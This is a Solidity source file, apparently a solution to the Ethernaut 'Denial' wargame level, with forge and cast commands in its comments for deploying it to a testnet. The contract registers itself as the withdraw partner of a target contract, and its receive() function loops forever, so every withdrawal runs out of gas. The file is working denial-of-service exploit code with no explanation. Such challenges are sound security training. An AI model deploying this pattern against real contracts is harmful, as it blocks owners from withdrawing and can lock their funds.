//SPDX-License-Identifier:UNLICENSED
// forge create HackDenial --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC
// cast send 0x3f825B9B8f5c661b17e8aCA9D170d1839cE8Df59 "exploit()" --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC

pragma solidity 0.8.17;

import "./Denial.sol";

contract HackDenial {
    Denial denial = Denial(payable(0x1E8E7970365586E2212Deb73B8b1BE442Db0cce8));

    function exploit() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}